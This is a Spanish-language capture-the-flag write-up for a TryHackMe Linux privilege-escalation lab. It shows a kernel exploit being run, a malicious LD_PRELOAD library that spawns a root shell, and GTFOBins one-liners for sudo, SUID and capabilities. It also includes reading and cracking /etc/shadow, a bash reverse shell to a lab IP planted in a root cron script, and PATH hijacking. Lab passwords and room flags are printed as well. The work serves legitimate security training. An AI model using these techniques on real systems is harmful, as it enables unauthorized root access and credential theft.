---
title: "TryHackMe: Linux Privilege Escalation"
category: "TryHackMe"
order: 29
tags: ["tryhackme", "linux", "privilege-escalation", "suid", "cron", "nfs", "capabilities", "unsolved"]
layout: layouts/writeup.njk
permalink: /writeups/thm-linux-privilege-escalation.html
---

> Nota: el Capstone Challenge final de esta room queda incompleto en mis notas — llegué a obtener credenciales en texto plano (`dark:qwerty1234#!hackme`) pensando en usarlas por SSH, pero el registro se corta ahí, sin confirmar la lectura de `user.txt`/`root.txt` finales. Todo el contenido técnico de las secciones anteriores (Kernel, Sudo, SUID, Capabilities, Cron Jobs, PATH, NFS) está completo y resuelto.

Esta room es un módulo extenso que cubre múltiples vectores clásicos de escalada de privilegios en Linux, cada uno con su propio ejercicio práctico.

## Kernel Exploits

```bash
hostnamectl
  Operating System: Ubuntu 14.04 LTS
  Kernel: Linux 3.13.0-24-generic
```

Con la versión de kernel identificada, se busca un exploit público conocido. En este caso, **CVE-2015-1328** (overlayfs incorrect permission handling + `FS_USERNS_MOUNT`) permite escalar a root compilando y ejecutando el exploit directamente:

```bash
$ gcc exploit.c -o pwn
$ ./pwn
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

## Sudo

`sudo -l` muestra qué comandos puede ejecutar el usuario actual como root. Dos técnicas cubiertas:

**Leverage application functions** — Apache2 permite cargar un archivo de configuración alternativo; apuntándolo a `/etc/shadow` genera un mensaje de error que filtra la primera línea del archivo.

**Leverage LD_PRELOAD** — si `env_keep` incluye `LD_PRELOAD`, se puede compilar una librería compartida maliciosa y forzar su carga antes de ejecutar cualquier binario con sudo:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

**Ejercicio — hash de la contraseña de frank:**

```bash
sudo -l
User karen may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

Según GTFOBins, con `sudo nano` → `CTRL-R` → `CTRL-X` → `reset; sh 1>&0 2>&0` se obtiene una shell root, permitiendo leer `/etc/shadow`.

## SUID

Los bits SUID/SGID permiten ejecutar un archivo con los privilegios de su dueño en lugar del usuario actual.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Si un binario con SUID root puede leer/editar archivos arbitrarios (ej. `nano`), hay dos vectores clásicos: leer `/etc/shadow` (y crackear con John tras `unshadow`) o añadir un usuario propio con UID 0 a `/etc/passwd`.

**Ejercicio — usuario con nombre de escritor de cómics:**

```bash
cat /etc/passwd
...
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
```

**Respuesta:** `gerryconway`

**Ejercicio — contraseña de user2 vía base64 con SUID:**

```bash
find / -type f -perm -04000 -ls 2>/dev/null
...
-rwsr-xr-x 1 root root 43352 /usr/bin/base64
```

GTFOBins indica cómo abusar de `base64` con SUID para leer archivos protegidos:

```bash
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```

Con el contenido de `/etc/passwd` y `/etc/shadow` extraído se arma el archivo para John:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
...
Password1        (karen)
Password1        (user2)
test123          (gerryconway)
```

**Contraseña de user2:** `Password1`

**Ejercicio — flag3.txt:** con el mismo truco de `base64` SUID, leído desde una sesión SSH como `user2`:

```bash
LFILE=/home/ubuntu/flag3.txt
base64 "$LFILE" | base64 --decode
$ THM-3847834
```

## Capabilities

Las capabilities gestionan privilegios a nivel más granular que SUID/SGID, y no son detectables buscando solo el bit SUID.

```bash
getcap -r / 2>/dev/null
```

**Ejercicio — otro binario explotable vía capabilities:**

```bash
getcap -r / 2>/dev/null
...
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

**Respuesta:** `6` (número total de binarios listados con capabilities)

**Ejercicio — flag4.txt:** GTFOBins indica el payload para `vim` con `cap_setuid`:

```bash
./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
# cat /home/ubuntu/flag4.txt
THM-9349843
```

## Cron Jobs

Tareas programadas que corren con los privilegios de su dueño. Si un cron job root ejecuta un script editable por el usuario actual, ese script correrá como root en la próxima ejecución.

```bash
cat /etc/crontab
...
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

**Ejercicio — cantidad de cron jobs definidos por el usuario:** `4`

**Ejercicio — flag5.txt vía reverse shell:** se sobrescribe `backup.sh` (ejecutado por root cada minuto) con una reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.21.33.55/9696 0>&1
```

```bash
chmod +x backup.sh
sudo nc -lvnp 9696
...
root@ip-10-10-202-231:~# cat /home/ubuntu/flag5.txt
THM-383000283
```

**Ejercicio — contraseña de Matt:** se extraen las líneas de `passwd`/`shadow` de Matt desde la reverse shell root y se crackean igual que antes:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
...
123456           (matt)
```

## PATH hijacking

Si un binario SUID invoca un ejecutable sin ruta absoluta (ej. `thm`), y algún directorio listado en `$PATH` es escribible por el usuario actual, se puede colocar ahí un binario malicioso con ese nombre para que el script SUID lo ejecute con privilegios root.

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

Si `/tmp` no está en `PATH`, se agrega: `export PATH=/tmp:$PATH`, y se coloca ahí una copia de `/bin/bash` renombrada al nombre esperado por el binario SUID.

**Ejercicio — carpeta inusual con permisos de escritura:**

```bash
find / -writable 2>/dev/null
...
/home/murdoch
```

**Respuesta:** `/home/murdoch`

**Ejercicio — flag6.txt vía PATH hijacking:**

```bash
export PATH=/home/murdoch:$PATH
cd /home/murdoch
echo "/bin/bash" >> thm
chmod 777 thm
./test
...
root@ip-10-10-160-26:/home/matt# cat flag6.txt
THM-736628929
```

## NFS (no_root_squash)

La configuración NFS vive en `/etc/exports`. Por defecto, NFS mapea el usuario root a `nfsnobody`, despojando privilegios root sobre archivos compartidos — salvo que la opción **`no_root_squash`** esté presente, en cuyo caso se puede montar el share, crear un binario con bit SUID desde la máquina atacante, y ejecutarlo con privilegios root en la máquina objetivo.

**Ejercicio — shares montables identificados:**

```bash
showmount -e 10.10.100.73
Export list for 10.10.100.73:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

**Respuesta:** 3 shares montables.

## Capstone Challenge

Combinando todo lo aprendido, se identifica de nuevo `base64` con bit SUID, permitiendo extraer `/etc/passwd` y `/etc/shadow` y crackear una contraseña (`Password1` para `missy`).

**Flag1** (en `/home/missy/Documents/flag1.txt`): `THM-42828719920544`

**Flag2** — `missy` puede correr `find` como root sin contraseña (`sudo -l`); según GTFOBins:

```bash
sudo find . -exec /bin/sh \; -quit
# cat /home/rootflag/flag2.txt
THM-168824782390238
```

Para el `user.txt` final de la máquina objetivo del capstone, tras obtener una shell como `postgres` (`python3 -c "import pty;pty.spawn('/bin/bash')"` para estabilizarla) se navega a los home de otros usuarios. El de `alison` contiene `user.txt` pero sin permisos de lectura; en el home de `dark` aparecen credenciales en texto plano (`dark:qwerty1234#!hackme`) pensadas para reutilizar vía SSH — aquí se cortan mis notas, sin confirmar el resultado final.

## Lecciones aprendidas

- Esta room cubre de forma sistemática los seis vectores de privesc en Linux más comunes en CTFs y evaluaciones reales: kernel exploits, mal uso de sudo, binarios SUID, capabilities, cron jobs mal configurados, PATH hijacking y NFS con `no_root_squash`.
- `base64` con bit SUID apareció como vector recurrente en varios ejercicios de esta room — un recordatorio de que **cualquier** binario capaz de leer archivos arbitrarios (no solo los "clásicos" como `nano`/`vim`/`find`) es candidato a revisión en GTFOBins cuando tiene SUID.
- Las capabilities son un vector "invisible" para una enumeración que solo busca el bit SUID (`find / -perm -04000`) — `getcap -r / 2>/dev/null` es un paso obligatorio adicional en cualquier checklist de enumeración.
- Cron jobs que referencian scripts sin ruta absoluta, o que apuntan a scripts ya eliminados, son un patrón de mala higiene operacional sorprendentemente común y fácil de explotar si algún directorio del `PATH` es escribible.
